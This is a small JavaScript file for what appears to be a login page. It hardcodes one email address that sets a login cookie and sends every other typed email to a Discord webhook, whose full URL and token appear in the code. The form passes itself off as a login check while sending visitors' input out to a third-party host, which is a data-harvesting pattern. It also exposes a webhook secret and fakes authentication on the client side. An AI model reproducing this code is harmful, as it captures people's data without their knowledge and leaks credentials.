function clickBody() {
    window.location.href = "monkeytoes999.github.io/brazeltonz/";
}

function success() {
    document.cookie = "login=jeff;";
}

function buttonClick() {
    const e = document.getElementById("email")
    const p = document.getElementById("pass")
    if (e.value == "kriffen@gmail.com"){
        document.cookie = "login=kriffen; expires=Thu, 7 Dec 2056 12:00:00 UTC;"
    } else {
        var URL = `https://discord.com/api/webhooks/988985468353912832/rvTkVc7bekRaNcoC72biErymB6NWnGs1zy2MVASOEXXTdX7Y4hDblVKQ7dJ0wsiY2rh_`;
        fetch(URL, {
            "method":"POST",
            "headers": {"Content-Type": "application/json"},
            "body": JSON.stringify({
                "content":e.value
            })

            })
            .then(res=> console.log(res))
            .catch(err => console.error(err));
    }
}